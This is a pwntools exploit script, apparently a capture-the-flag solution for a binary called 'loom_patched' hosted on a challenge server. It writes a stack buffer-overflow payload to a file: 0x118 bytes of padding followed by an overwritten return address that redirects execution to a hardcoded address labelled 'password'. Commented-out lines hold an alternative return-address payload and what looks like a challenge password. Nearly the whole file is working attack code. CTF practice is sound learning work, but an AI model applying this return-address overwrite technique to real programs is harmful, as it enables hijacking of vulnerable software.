#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("loom_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("0.cloud.chals.io", 33616)

    return r

sla = lambda r,a,b : r.sendlineafter(f'{a}',f'{b}')
ru = lambda r,a : r.recvuntil(f'{a}')
sl = lambda r,a : r.sendline(f'{a}')

overwrite = 0x00402092
password = 0x40232a

def main():
    with open('payload', 'wb') as r:
        r.write(b'1\n')
        r.write(b'1\n')

        #payload = b"A"*0x98 + p64(0x4012b6) + p64(0)+ b'\n'
        payload = b"A"*0x118 + b'\x2a\x23\x40\x00\x00\x00' + b'\n'
        r.write(payload)
        r.write(b'2\n')
        #r.write(b'3\n')
        #r.write(b'QjVHST7M11cY7Ws6mXU1\n')
        #r.write(b'1\n')
        r.close()

    # good luck pwning :)



if __name__ == "__main__":
    main()
